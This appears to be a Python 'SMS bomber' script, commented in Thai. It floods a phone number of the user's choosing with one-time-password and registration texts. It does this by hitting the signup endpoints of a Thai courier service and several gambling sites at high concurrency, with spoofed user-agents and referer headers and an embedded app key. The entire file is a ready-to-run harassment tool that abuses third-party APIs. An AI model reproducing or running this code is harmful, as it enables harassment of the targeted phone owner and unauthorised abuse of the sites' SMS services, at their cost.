import asyncio
import aiohttp
import random
import time
from fake_useragent import UserAgent

ua = UserAgent()

# API Configuration (เฉพาะ API ที่มีประสิทธิภาพสูง)
API_CONFIG = {
    "api2": {"url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}", "data": None, "headers": {"Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"}, "method": "post", "success": lambda r: '"code":200' in r},
    "api5": {"url": "https://m.cdo888.bet/ajax/submitOTP", "data": lambda p: f"send_otp={p}", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://m.cdo888.bet", "Referer": "https://m.cdo888.bet/user/register"}, "method": "post", "success": lambda r: '"status":"success"' in r},
    "api8": {"url": "https://www.johnwick168.me/signup.php", "data": lambda p: f"act=step-1&tel={p}", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.johnwick168.me", "Referer": "https://www.johnwick168.me/signup.php"}, "method": "post", "success": lambda r: True},
    "api12": {"url": "https://gw.mgame666.com/AuthAPI/SendSms", "data": lambda p: {"Phone": p}, "headers": {"Content-Type": "application/json", "Origin": "https://okmega.pgm77.com", "Referer": "https://okmega.pgm77.com/"}, "method": "post", "success": lambda r: True},
    "api23": {"url": "https://www.i828th.com/api/user/request-register-tac", "data": lambda p: {"uname": f"66{p}", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"}, "headers": {"Content-Type": "application/json", "Origin": "https://www.i828th.com", "Referer": "https://www.i828th.com/th-th?signup=1"}, "method": "post", "success": lambda r: '"code":1' in r},
    "api24": {"url": "https://www.thai191.com/api/user/request-register-tac", "data": lambda p: {"sendType": "mobile", "currency": "THB", "country_code": "66", "mobileno": p, "language": "th", "langCountry": "th-th"}, "headers": {"Content-Type": "application/json"}, "method": "post", "success": lambda r: '"code":1' in r},
}

# สถานะ API และตัวนับความสำเร็จ
api_status = {k: {"active": True, "cooldown": 0} for k in API_CONFIG}
success_count = 0

async def send_request(session, api_name, phone, sem):
    async with sem:
        if not api_status[api_name]["active"] or time.time() < api_status[api_name]["cooldown"]:
            return False
        cfg = API_CONFIG[api_name]
        url = cfg["url"].format(phone=phone)
        headers = {"User-Agent": ua.random, **cfg["headers"]}
        data = cfg["data"](phone) if cfg["data"] else None
        try:
            async with session.request(cfg["method"], url, headers=headers, json=data if isinstance(data, dict) else None, data=data if isinstance(data, str) else None, timeout=10) as resp:
                if resp.status in (200, 201):
                    text = await resp.text()
                    if cfg["success"](text):
                        global success_count
                        success_count += 1
                        print(f"ส่ง SMS สำเร็จครั้งที่ {success_count} | เบอร์ {phone} | API: {api_name}")
                        return True
        except Exception:
            api_status[api_name]["active"] = False
            api_status[api_name]["cooldown"] = time.time() + 10  # Cooldown 10 วินาที
        return False

async def send_sms(phone, target_successes):
    # ทำความสะอาดเบอร์โทร
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): phone = "0" + phone[2:]
    elif phone.startswith("+66"): phone = "0" + phone[3:]
    if len(phone) != 10:
        print("เบอร์ไม่ถูกต้อง (ต้องมี 10 หลัก)")
        return

    # จำกัดเวลารวม (10 นาที)
    start_time = time.time()
    timeout = 600  # 10 นาที
    sem = asyncio.Semaphore(20)  # เพิ่มเป็น 20 เพื่อความเร็ว

    async with aiohttp.ClientSession() as session:
        while success_count < target_successes and time.time() - start_time < timeout:
            active_apis = [k for k, v in api_status.items() if v["active"] and time.time() >= v["cooldown"]]
            if not active_apis:
                print("ไม่มี API ที่ใช้งานได้ รอ 3 วินาที...")
                await asyncio.sleep(3)
                continue

            # สร้าง tasks โดยสุ่ม API เพื่อกระจายโหลด
            tasks = []
            for _ in range(min(20, len(active_apis))):  # ส่งสูงสุด 20 request ต่อรอบ
                api_name = random.choice(active_apis)
                tasks.append(send_request(session, api_name, phone, sem))
                await asyncio.sleep(random.uniform(0.005, 0.05))  # ลด delay ให้รัว
            await asyncio.gather(*tasks)

    print(f"ส่ง SMS เสร็จสิ้น | สำเร็จ {success_count}/{target_successes} ครั้ง ✅")

if __name__ == "__main__":
    phone = input("กรุณาใส่เบอร์โทรศัพท์: ")
    try:
        target = int(input("กรุณาใส่จำนวนครั้งที่ต้องการส่ง SMS: "))
        asyncio.run(send_sms(phone, target))
    except ValueError:
        print("จำนวนครั้งต้องเป็นตัวเลขจำนวนเต็ม")
